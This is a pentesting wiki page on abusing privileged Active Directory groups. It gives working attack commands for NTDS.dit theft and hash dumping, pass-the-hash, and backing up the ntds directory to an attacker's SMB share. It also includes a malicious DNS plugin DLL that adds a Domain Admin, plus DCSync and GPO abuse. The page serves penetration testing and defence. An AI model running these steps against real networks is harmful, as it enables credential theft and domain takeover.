_body: "# Privileged Groups\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Well Known groups with administration\
  \ privileges\n\n- **Administrators**\n- **Domain Admins**\n- **Enterprise Admins**\n\n## Account Operators\n\nThis group\
  \ is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login\
  \ to the Domain Controller (DC).\n\nTo identify the members of this group, the following command is executed:\n\n```bash\n\
  Get-NetGroupMember -Identity \"Account Operators\" -Recurse\n```\n\nAdding new users is permitted, as well as local login\
  \ to the DC.\n\n## AdminSDHolder group\n\nThe **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets\
  \ permissions for all \"protected groups\" within Active Directory, including high-privilege groups. This mechanism ensures\
  \ the security of these groups by preventing unauthorized modifications.\n\nAn attacker could exploit this by modifying\
  \ the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user\
  \ full control over all protected groups. If this user's permissions are altered or removed, they would be automatically\
  \ reinstated within an hour due to the system's design.\n\nRecent Windows Server documentation still treats several built-in\
  \ operator groups as **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`,\
  \ `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). The **SDProp** process runs on the\
  \ **PDC Emulator** every 60 minutes by default, stamps `adminCount=1`, and disables inheritance on protected objects. This\
  \ is useful both for persistence and for hunting stale privileged users that were removed from a protected group but still\
  \ keep the non-inheriting ACL.\n\nCommands to review the members and modify permissions include:\n\n```bash\nGet-NetGroupMember\
  \ -Identity \"AdminSDHolder\" -Recurse\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local'\
  \ -PrincipalIdentity matt -Rights All\nGet-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference\
  \ -match 'spotless'}\n```\n\n```powershell\n# Hunt users/groups that still have adminCount=1\nGet-ADObject -LDAPFilter '(adminCount=1)'\
  \ -Properties adminCount,distinguishedName |\n  Select-Object distinguishedName\n```\n\nA script is available to expedite\
  \ the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).\n\
  \nFor more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).\n\
  \n## AD Recycle Bin\n\nMembership in this group allows for the reading of deleted Active Directory objects, which can reveal\
  \ sensitive information:\n\n```bash\nGet-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *\n```\n\
  \nThis is useful for **recovering previous privilege paths**. Deleted objects can still expose `lastKnownParent`, `memberOf`,\
  \ `sIDHistory`, `adminCount`, old SPNs, or the DN of a deleted privileged group that can later be restored by another operator.\n\
  \n```powershell\nGet-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `\n  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName\
  \ |\n  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName\n```\n\n### Domain Controller\
  \ Access\n\nAccess to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes\
  \ the level of access.\n\n### Privilege Escalation\n\nUsing `PsService` or `sc` from Sysinternals, one can inspect and modify\
  \ service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for\
  \ the execution of arbitrary commands and privilege escalation:\n\n```cmd\nC:\\> .\\PsService.exe security AppReadiness\n\
  ```\n\nThis command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated\
  \ privileges.\n\n## Backup Operators\n\nMembership in the `Backup Operators` group provides access to the `DC01` file system\
  \ due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying\
  \ capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts\
  \ is necessary for this process.\n\nTo list group members, execute:\n\n```bash\nGet-NetGroupMember -Identity \"Backup Operators\"\
  \ -Recurse\n```\n\n### Local Attack\n\nTo leverage these privileges locally, the following steps are employed:\n\n1. Import\
  \ necessary libraries:\n\n```bash\nImport-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\n\
  ```\n\n2. Enable and verify `SeBackupPrivilege`:\n\n```bash\nSet-SeBackupPrivilege\nGet-SeBackupPrivilege\n```\n\n3. Access\
  \ and copy files from restricted directories, for instance:\n\n```bash\ndir C:\\Users\\Administrator\\\nCopy-FileSeBackupPrivilege\
  \ C:\\Users\\Administrator\\report.pdf c:\\temp\\x.pdf -Overwrite\n```\n\n### AD Attack\n\nDirect access to the Domain Controller's\
  \ file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.\n\
  \n#### Using diskshadow.exe\n\n1. Create a shadow copy of the `C` drive:\n\n```cmd\ndiskshadow.exe\nset verbose on\nset\
  \ metadata C:\\Windows\\Temp\\meta.cab\nset context clientaccessible\nbegin backup\nadd volume C: alias cdrive\ncreate\n\
  expose %cdrive% F:\nend backup\nexit\n```\n\n2. Copy `NTDS.dit` from the shadow copy:\n\n```cmd\nCopy-FileSeBackupPrivilege\
  \ E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\n```\n\nAlternatively, use `robocopy` for file copying:\n\n```cmd\nrobocopy\
  \ /B F:\\Windows\\NTDS .\\ntds ntds.dit\n```\n\n3. Extract `SYSTEM` and `SAM` for hash retrieval:\n\n```cmd\nreg save HKLM\\\
  SYSTEM SYSTEM.SAV\nreg save HKLM\\SAM SAM.SAV\n```\n\n4. Retrieve all hashes from `NTDS.dit`:\n\n```shell-session\nsecretsdump.py\
  \ -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL\n```\n\n5. Post-extraction: Pass-the-Hash to DA\n\n```bash\n\
  # Use the recovered Administrator NT hash to authenticate without the cleartext password\nnetexec winrm <DC_FQDN> -u Administrator\
  \ -H <ADMIN_NT_HASH> -x \"whoami\"\n\n# Or execute via SMB using an exec method\nnetexec smb <DC_FQDN> -u Administrator\
  \ -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd\n```\n\n#### Using wbadmin.exe\n\n1. Set up NTFS filesystem for SMB server\
  \ on attacker machine and cache SMB credentials on the target machine.\n2. Use `wbadmin.exe` for system backup and `NTDS.dit`\
  \ extraction:\n   ```cmd\n   net use X: \\\\<AttackIP>\\sharename /user:smbuser password\n   echo \"Y\" | wbadmin start\
  \ backup -backuptarget:\\\\<AttackIP>\\sharename -include:c:\\windows\\ntds\n   wbadmin get versions\n   echo \"Y\" | wbadmin\
  \ start recovery -version:<date-time> -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:C:\\ -notrestoreacl\n\
  \   ```\n\nFor a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).\n\
  \n## DnsAdmins\n\nMembers of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges\
  \ on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.\n\n\
  To list members of the DnsAdmins group, use:\n\n```bash\nGet-NetGroupMember -Identity \"DnsAdmins\" -Recurse\n```\n\n###\
  \ Execute arbitrary DLL (CVE‑2021‑40469)\n\n> [!NOTE]\n> This vulnerability allows for the execution of arbitrary code with\
  \ SYSTEM privileges in the DNS service (usually inside the DCs). This issue was fixed in 2021.\n\nMembers can make the DNS\
  \ server load an arbitrary DLL (either locally or from a remote share) using commands such as:\n\n```bash\ndnscmd [dc.computername]\
  \ /config /serverlevelplugindll c:\\path\\to\\DNSAdmin-DLL.dll\ndnscmd [dc.computername] /config /serverlevelplugindll \\\
  \\1.2.3.4\\share\\DNSAdmin-DLL.dll\nAn attacker could modify the DLL to add a user to the Domain Admins group or execute\
  \ other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:\n\n# If dnscmd is not installed run\
  \ from aprivileged PowerShell session:\nInstall-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools\n```\n\n```c\n\
  // Modify DLL to add user\nDWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)\n{\n   \
  \ system(\"C:\\\\Windows\\\\System32\\\\net.exe user Hacker T0T4llyrAndOm... /add /domain\");\n    system(\"C:\\\\Windows\\\
  \\System32\\\\net.exe group \\\"Domain Admins\\\" Hacker /add /domain\");\n}\n```\n\n```bash\n// Generate DLL with msfvenom\n\
  msfvenom -p windows/x64/exec cmd='net group \"domain admins\" <username> /add /domain' -f dll -o adduser.dll\n```\n\nRestarting\
  \ the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:\n\n```csharp\nsc.exe\
  \ \\\\dc01 stop dns\nsc.exe \\\\dc01 start dns\n```\n\nFor more details on this attack vector, refer to ired.team.\n\n####\
  \ Mimilib.dll\n\nIt's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands\
  \ or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)\
  \ for more information.\n\n### WPAD Record for MitM\n\nDnsAdmins can manipulate DNS records to perform Man-in-the-Middle\
  \ (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh\
  \ can be used for spoofing and capturing network traffic.\n\n### Event Log Readers\nMembers can access event logs, potentially\
  \ finding sensitive information such as plaintext passwords or command execution details:\n\n```bash\n# Get members and\
  \ search logs for sensitive information\nGet-NetGroupMember -Identity \"Event Log Readers\" -Recurse\nGet-WinEvent -LogName\
  \ security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}\n```\n\n## Exchange Windows Permissions\n\
  \nThis group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation\
  \ exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.\n\n```bash\n# List members\nGet-NetGroupMember\
  \ -Identity \"Exchange Windows Permissions\" -Recurse\n```\n\nIf you can act as a member of this group, the classic abuse\
  \ is to grant an attacker-controlled principal the replication rights needed for [DCSync](dcsync.md):\n\n```bash\nAdd-DomainObjectAcl\
  \ -TargetIdentity \"DC=testlab,DC=local\" -PrincipalIdentity attacker -Rights DCSync\nGet-ObjectAcl -DistinguishedName \"\
  DC=testlab,DC=local\" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}\n```\n\nHistorically, **PrivExchange** chained\
  \ mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay\
  \ path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value\
  \ route to domain replication rights.\n\n## Hyper-V Administrators\n\nHyper-V Administrators have full access to Hyper-V,\
  \ which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting\
  \ NTLM hashes from the NTDS.dit file.\n\n### Exploitation Example\n\nThe practical abuse is usually **offline access to\
  \ DC disks/checkpoints** rather than old host-level LPE tricks. With access to the Hyper-V host, an operator can checkpoint\
  \ or export a virtualized Domain Controller, mount the VHDX, and extract `NTDS.dit`, `SYSTEM`, and other secrets without\
  \ touching LSASS inside the guest:\n\n```bash\n# Host-side enumeration\nGet-VM\nGet-VHD -VMId <vm-guid>\n\n# After exporting\
  \ or checkpointing the DC, mount the disk read-only\nMount-VHD -Path 'C:\\HyperV\\Virtual Hard Disks\\DC01.vhdx' -ReadOnly\n\
  ```\n\nFrom there, reuse the `Backup Operators` workflow to copy `Windows\\NTDS\\ntds.dit` and the registry hives offline.\n\
  \n## Group Policy Creators Owners\t\n\nThis group allows members to create Group Policies in the domain. However, its members\
  \ can't apply group policies to users or group or edit existing GPOs.\n\nThe important nuance is that the **creator becomes\
  \ owner of the new GPO** and usually gets enough rights to edit it afterwards. That means this group is interesting when\
  \ you can either:\n\n- create a malicious GPO and convince an admin to link it to a target OU/domain\n- edit a GPO you created\
  \ that is already linked somewhere useful\n- abuse another delegated right that lets you link GPOs, while this group gives\
  \ you the edit side\n\nPractical abuse normally means adding an **Immediate Task**, **startup script**, **local admin membership**,\
  \ or **user rights assignment** change through SYSVOL-backed policy files.\n\n```bash\n# Example with SharpGPOAbuse: add\
  \ an immediate task that executes as SYSTEM\nSharpGPOAbuse.exe --AddImmediateTask --TaskName \"HT-Task\" --Author TESTLAB\\\
  \\Administrator --Command \"cmd.exe\" --Arguments \"/c whoami > C:\\\\Windows\\\\Temp\\\\gpo.txt\" --GPOName \"Security\
  \ Update\"\n```\n\nIf editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`,\
  \ `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.\n\n\
  ## Organization Management\n\nIn environments where **Microsoft Exchange** is deployed, a special group known as **Organization\
  \ Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users**\
  \ and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes\
  \ the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.\n\n### Privilege Exploitation\
  \ and Commands\n\n#### Print Operators\n\nMembers of the **Print Operators** group are endowed with several privileges,\
  \ including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down,\
  \ and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated\
  \ context, bypassing User Account Control (UAC) is necessary.\n\nTo list the members of this group, the following PowerShell\
  \ command is used:\n\n```bash\nGet-NetGroupMember -Identity \"Print Operators\" -Recurse\n```\n\nOn Domain Controllers this\
  \ group is dangerous because the default Domain Controller Policy grants **`SeLoadDriverPrivilege`** to `Print Operators`.\
  \ If you reach an elevated token for a member of this group, you can enable the privilege and load a signed-but-vulnerable\
  \ driver to jump to kernel/SYSTEM. For token handling details, check [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).\n\
  \n#### Remote Desktop Users\n\nThis group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate\
  \ these members, PowerShell commands are available:\n\n```bash\nGet-NetGroupMember -Identity \"Remote Desktop Users\" -Recurse\n\
  Get-NetLocalGroupMember -ComputerName <pc name> -GroupName \"Remote Desktop Users\"\n```\n\nFurther insights into exploiting\
  \ RDP can be found in dedicated pentesting resources.\n\n#### Remote Management Users\n\nMembers can access PCs over **Windows\
  \ Remote Management (WinRM)**. Enumeration of these members is achieved through:\n\n```bash\nGet-NetGroupMember -Identity\
  \ \"Remote Management Users\" -Recurse\nGet-NetLocalGroupMember -ComputerName <pc name> -GroupName \"Remote Management Users\"\
  \n```\n\nFor exploitation techniques related to **WinRM**, specific documentation should be consulted.\n\n#### Server Operators\n\
  \nThis group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges,\
  \ changing system time, and shutting down the system. To enumerate the members, the command provided is:\n\n```bash\nGet-NetGroupMember\
  \ -Identity \"Server Operators\" -Recurse\n```\n\nOn Domain Controllers, `Server Operators` commonly inherit enough rights\
  \ to **reconfigure or start/stop services** and also receive `SeBackupPrivilege`/`SeRestorePrivilege` through the default\
  \ DC policy. In practice, this makes them a bridge between **service-control abuse** and **NTDS extraction**:\n\n```cmd\n\
  sc.exe \\\\dc01 query\nsc.exe \\\\dc01 qc <service>\n.\\PsService.exe security <service>\n```\n\nIf a service ACL gives\
  \ this group change/start rights, point the service at an arbitrary command, start it as `LocalSystem`, and then restore\
  \ the original `binPath`. If service control is locked down, fall back to the `Backup Operators` techniques above to copy\
  \ `NTDS.dit`.\n\n## References <a href=\"#references\" id=\"references\"></a>\n\n- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)\n\
